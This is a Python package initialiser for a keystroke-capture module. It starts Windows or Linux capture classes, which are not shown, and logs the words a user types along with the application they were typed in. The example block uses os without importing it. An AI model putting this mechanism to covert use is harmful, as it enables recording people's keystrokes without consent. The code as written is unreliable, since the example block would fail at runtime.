# Keystroke capture package
# This __init__.py can be used to provide a unified interface
# to the platform-specific implementations.

import sys
from .. import config as app_config # To get config for filtering, etc.
from .. import logger as app_logger # To log captured keystrokes

# Placeholder for the actual capture function
# This will be replaced by platform-specific calls
_capture_instance = None

def start_capture(config, log_callback):
    """
    Starts keystroke capturing based on the operating system.
    'config' is the application configuration.
    'log_callback' is a function to call with the captured keyword string.
    """
    global _capture_instance
    if sys.platform == "win32":
        from . import windows as win_capture
        _capture_instance = win_capture.WindowsKeyCapture(config, log_callback)
        _capture_instance.start()
        print("Windows keystroke capture started.")
    elif sys.platform.startswith("linux"):
        from . import linux as lin_capture
        _capture_instance = lin_capture.LinuxKeyCapture(config, log_callback)
        _capture_instance.start()
        print("Linux keystroke capture started.")
    else:
        app_logger.log_error(f"Keystroke capture not supported on this platform: {sys.platform}", config)
        raise NotImplementedError(f"Keystroke capture not supported on platform {sys.platform}")

def stop_capture():
    """Stops the currently running keystroke capture."""
    global _capture_instance
    if _capture_instance:
        _capture_instance.stop()
        _capture_instance = None
        print("Keystroke capture stopped.")

# Example of how it might be used by the main application:
if __name__ == '__main__':
    # This is a simplified example.
    # The main app would load config properly and pass it.
    mock_config = app_config.DEFAULT_CONFIG
    # Ensure a log directory exists for the logger to potentially write error logs
    # In a real scenario, logger.initialize_logger would be called first.
    if not os.path.exists(mock_config['log_directory']):
        os.makedirs(mock_config['log_directory'])

    # Setup a dummy logger for this example
    # In the real app, logger.initialize_logger(mock_config) would be called.
    # For now, make sure error_log_path can be determined.
    mock_config['config_file_path'] = os.path.abspath(app_config.CONFIG_FILE_NAME) # For logger pathing

    def my_log_handler(keyword_info):
        # In real app, this would be app_logger.log_keyword
        print(f"KEYWORD LOGGED: App: '{keyword_info['app']}', Word: '{keyword_info['word']}'")

    print(f"Attempting to start capture on {sys.platform}...")
    try:
        start_capture(mock_config, my_log_handler)
        print("Capture started. Type something (Ctrl+C to stop if it's blocking).")
        # Keep alive for a bit for testing (if non-blocking)
        if sys.platform.startswith("linux"): # Linux pynput listener is non-blocking by default if run in thread
             import time
             for i in range(10): # Run for 10 seconds
                 print(".")
                 time.sleep(1)
             stop_capture()
        # For Windows, pyHook blocks, so this part might not be reached until hook stops.
        # If pynput is used on Windows, it can also be non-blocking if run in a thread.
    except NotImplementedError as e:
        print(e)
    except KeyboardInterrupt:
        print("Interrupted by user.")
    finally:
        stop_capture()
        print("Capture module example finished.")
